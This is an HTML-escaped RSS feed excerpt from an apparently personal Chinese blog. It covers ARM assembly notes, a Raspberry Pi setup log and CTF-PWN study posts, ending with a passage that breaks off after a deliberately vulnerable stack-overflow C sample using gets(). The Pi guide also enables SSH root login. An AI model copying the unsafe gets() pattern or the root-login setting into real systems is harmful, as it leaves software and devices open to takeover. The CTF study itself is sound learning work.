&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810162414.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>如何区分取址模式：&lt;/p>
&lt;p>如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。&lt;/p>
&lt;p>如果在外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器重的地址，之后再更新基址寄存器&lt;/p>
&lt;p>除此之外，就都是偏移取址模式了&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>关于PC相对取址的LDR指令&lt;/strong>&lt;/p>
&lt;p>有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.section .text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, =jump /* 加载jump标签所在的内存位置到R0 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, =0x68DB00AD /* 加载立即数0x68DB00AD到R1 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jump:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, =511 /* 加载立即数511到R2 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这些指令学术上被称作伪指令。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>在ARM中使用立即数的规律&lt;/strong>&lt;/p>
&lt;p>在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。&lt;/p>
&lt;p>立即数的值：v = n ror 2*r 有效的立即数都可以通过循环右移来得到&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">#256 // 1 循环右移 24位 --&amp;gt; 256
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#384 // 6 循环右移 26位 --&amp;gt; 384
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#484 // 121 循环右移 30位 --&amp;gt; 484
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#16384 // 1 循环右移 18位 --&amp;gt; 16384
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#2030043136 // 121 循环右移 8位 --&amp;gt; 2030043136
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#0x06000000 // 6 循环右移 8位 --&amp;gt; 100663296 (十六进制值0x06000000)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invalid values:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#370 // 185 循环右移 31位 --&amp;gt; 31不在范围内 (0 – 30)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#511 // 1 1111 1111 --&amp;gt; 比特模型不符合
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#0x06010000 // 1 1000 0001.. --&amp;gt; 比特模型不符合
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题：&lt;/p>
&lt;ul>
&lt;li>用小部分去组成更大的值。 MOV r0, #511 将511分成两部分：MOV r0, #256, and ADD r0, #255&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">.section .text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov r0, &lt;span class="c1">#256 /* 1 ror 24 = 256, so it&amp;#39;s valid */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add r0, &lt;span class="c1">#255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, &lt;span class="o">=&lt;/span>&lt;span class="m">511&lt;/span> /* load &lt;span class="m">511&lt;/span> from the literal pool using LDR */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>计算立即数的有效值脚本：https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">azeria@labs:~$ python rotator.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter the value you want to check: &lt;span class="m">511&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Sorry, &lt;span class="m">511&lt;/span> cannot be used as an immediate number and has to be split.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">azeria@labs:~$ python rotator.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter the value you want to check: &lt;span class="m">256&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The number &lt;span class="m">256&lt;/span> can be used as a valid immediate number.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> ror &lt;span class="m">24&lt;/span> --&amp;gt; &lt;span class="m">256&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>下面的部分指令用到在详细查，记的话脑壳痛&lt;/p>
&lt;h3 id="跳转指令">跳转指令&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>B&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BX&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BXL&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="存储器操作指令">存储器操作指令&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>LDM&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>STM&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>PUSH&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>POP&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SWP&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="数据处理">数据处理&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>MOV&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MVN&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ADD&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ADC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SUB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>RSB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SBC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>RSC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MUL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MLS&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MLA&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>UMULL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>UMLAL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMUULL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMLAL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMLAD&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMLSD&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SDIV&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>UDIV&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ASR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>AND&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ORR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>EOR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BIC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>LSL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>LSR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>RRX&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ROR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>CMP&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>CMN&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>TSL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>TEQ&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="其他指令">其他指令&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>SWI&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>NOP&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MRS&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MSR&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="heading">&lt;/h3>
&lt;/li>
&lt;/ul></description></item><item><title>Raspberry_Pi_3B+_0安装使用</title><link>https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</link><pubDate>Sun, 23 Jun 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</guid><description>&lt;h1 id="raspberry_pi_3b_0安装使用">Raspberry_Pi_3B+_0安装使用&lt;/h1>
&lt;h2 id="raspberry-pi-3b-0安装使用">Raspberry Pi 3B+ 0安装使用&lt;/h2>
&lt;h3 id="0x00-购买">0x00 购买&lt;/h3>
&lt;p>终于下手买了。打算用来学习ARM、以及一些硬件的知识。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>3B+ 裸机&lt;/p>
&lt;/li>
&lt;li>
&lt;p>32G SD card&lt;/p>
&lt;/li>
&lt;li>
&lt;p>散热片&lt;/p>
&lt;/li>
&lt;li>
&lt;p>保护壳&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005746.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x01-安装系统">0x01 安装系统&lt;/h3>
&lt;p>首先下载系统镜像。&lt;/p>
&lt;p>官网有挺多系统可以选择，这里选择了安装&lt;a class="link" href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener"
>Raspbian&lt;/a> desktop最新版&lt;/p>
&lt;p>之后打算装Lite版，手上没有多余的显示器。而且桌面版占用很高。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190622221745.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>迅雷，3分钟搞定。&lt;/p>
&lt;p>其次开始向SD卡中写镜像。&lt;/p>
&lt;p>买的32G闪迪的高速卡，现在32G都白菜价了，想想几年前16G的死贵。&lt;/p>
&lt;p>官方教程用的是&lt;a class="link" href="https://etcher.io/" target="_blank" rel="noopener"
>Etcher&lt;/a> ，也可以用&lt;a class="link" href="https://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener"
>Win32DiskImager&lt;/a>。这里省事还是用Etcher。&lt;/p>
&lt;p>步骤&lt;/p>
&lt;ol>
&lt;li>
&lt;p>下载&lt;a class="link" href="https://etcher.io/" target="_blank" rel="noopener"
>etcher.io&lt;/a>安装包安装Etcher](&lt;a class="link" href="https://etcher.io/" target="_blank" rel="noopener"
>https://etcher.io/&lt;/a>)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>运行Etcher,选择镜像和sd卡&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190622222523.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>Flash一键搞定。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190622223043.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x02-配置">0x02 配置&lt;/h3>
&lt;p>系统安装完，开始进行配置。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623003205.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>先连上显示器看看&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623003758.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>然而平时显示器还是要连笔记本，而且这分辨率好糊。所以还是配ssh和VNC连接使用吧。&lt;/p>
&lt;ul>
&lt;li>修改源&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl"># 编辑 `/etc/apt/sources.list` 文件，删除原文件所有内容，用以下内容取代：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 编辑 `/etc/apt/sources.list.d/raspi.list` 文件，删除原文件所有内容，用以下内容取代：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>sudo apt update&lt;/code>&lt;/p>
&lt;ul>
&lt;li>拓展SD卡&lt;/li>
&lt;/ul>
&lt;p>&lt;code>sudo raspi-config&lt;/code> -&amp;gt; Advanced Opt -&amp;gt; A1 Expand Filesystem&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623140154.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>ssh 配置&lt;/li>
&lt;/ul>
&lt;p>最新版系统直接想要的接口打开就OK&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623004049.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>允许root登陆，修改&lt;code>/etc/ssh/sshd.conf&lt;/code> 下的&lt;code>PermitRootLogin yes&lt;/code> &lt;code>StrictModes yes&lt;/code> 就ok。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623004313.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>VNC&lt;/li>
&lt;/ul>
&lt;p>win10下载&lt;a class="link" href="https://www.realvnc.com/" target="_blank" rel="noopener"
>vnc客户端&lt;/a>&lt;/p>
&lt;p>RaspberryPI 命令开启server:&lt;code>vncserver&lt;/code>&lt;/p>
&lt;p>连接成功：&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623004603.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>连接出现分辨率问题&lt;/p>
&lt;p>设置分辨率：命令&lt;code>sudo raspi-config&lt;/code>-&amp;gt;Advanced Opt -&amp;gt;Resolution选择分辨率。重启就完事。&lt;/p>
&lt;h3 id="0x04-硬件检查">0x04 硬件检查&lt;/h3>
&lt;ol>
&lt;li>系统镜像版本号&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005614.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>板子型号：&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005511.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>&lt;strong>系统固件版本号&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005714.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>看看硬件：&lt;/p>
&lt;ol>
&lt;li>usb&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010117.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>cpu&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010156.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>说好的v8?&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010258.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>网卡&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010503.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010528.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x05-总结">0x05 总结&lt;/h3>
&lt;p>闲了很久，现在终于动手搞自己想搞的东西，花了一个晚上，搞完这些简单的安装配置，挺费时费力的，不过自己开心就好。最好是自己能够坚持下去，做更多有趣的事。&lt;/p>
&lt;p>&lt;img src="https://as2.bitinn.net/uploads/5d/cjvmpwzcf000bx38hgr1oua5d.1080p.jpg"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>12&lt;/p></description></item><item><title>CTF-PWN刷题记录-CTFWiki_3堆利用（待补充）</title><link>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Thu, 04 Apr 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="ctf-pwn刷题记录-ctfwiki_3堆利用待补充">CTF-PWN刷题记录-CTFWiki_3堆利用（待补充）&lt;/h1>
&lt;h2 id="简介">简介&lt;/h2></description></item><item><title>CTF-PWN刷题记录-CTFWiki_2格式化字符串漏洞（待补充）</title><link>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Fri, 22 Mar 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="ctf-pwn刷题记录-ctfwiki_2格式化字符串漏洞待补充">CTF-PWN刷题记录-CTFWiki_2格式化字符串漏洞（待补充）&lt;/h1>
&lt;h2 id="简介">简介&lt;/h2></description></item><item><title>ROP练习(空)</title><link>https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/</link><pubDate>Thu, 28 Feb 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/</guid><description>&lt;h1 id="rop练习空">ROP练习(空)&lt;/h1>
&lt;h3 id="题目列表">题目列表：&lt;/h3>
&lt;h3 id="ip47106212155">IP:&lt;code>47.106.212.155&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ret2libc3&lt;/p>
&lt;p>10008&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ret2shellcode&lt;/p>
&lt;p>10002&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ret2libc&lt;/p>
&lt;p>10005&lt;/p>
&lt;/li>
&lt;li>
&lt;p>train.cs.nctu.edu.tw: rop&lt;/p>
&lt;/li>
&lt;li>
&lt;p>2013-PlaidCTF-ropasaurusrex&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Defcon 2015 Qualifier: R0pbaby&lt;/p>
&lt;p>10012&lt;/p>
&lt;/li>
&lt;li>
&lt;p>train.cs.nctu.edu.tw: ret2libc&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AliCTF 2016：vss&lt;/p>
&lt;/li>
&lt;li>
&lt;p>RCTF2015-welpwn&lt;/p>
&lt;p>10010&lt;/p>
&lt;/li>
&lt;li>
&lt;p>lctf16-pwn100&lt;/p>
&lt;p>10011&lt;/p>
&lt;/li>
&lt;li>
&lt;p>xdctf15-pwn200&lt;/p>
&lt;p>10013&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>WP（持续更新）：&lt;/p></description></item><item><title>CTF-PWN刷题记录-CTFWiki_1栈溢出</title><link>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</link><pubDate>Wed, 20 Feb 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</guid><description>&lt;h1 id="ctf-pwn刷题记录-ctfwiki_1栈溢出">CTF-PWN刷题记录-CTFWiki_1栈溢出&lt;/h1>
&lt;hr>
&lt;blockquote>
&lt;p>看CTFWiki来入门CTF-PWN (Linux和arm) 做个记录&lt;/p>
&lt;/blockquote>
&lt;p>知识点：PWN相关知识点总结&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Linux PWN&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ARM PWN&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>题目全部来源于 &lt;a class="link" href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank" rel="noopener"
>CTFWiki&lt;/a> 上所涉及题目&lt;/p>
&lt;h2 id="linux-pwn">Linux PWN&lt;/h2>
&lt;p>大部分原理参考&lt;a class="link" href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank" rel="noopener"
>CTFWiki&lt;/a>&lt;/p>
&lt;h3 id="栈溢出">栈溢出&lt;/h3>
&lt;h3 id="基本栈溢出">基本栈溢出&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">success&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;You Hava already controlled it.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vulnerable&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
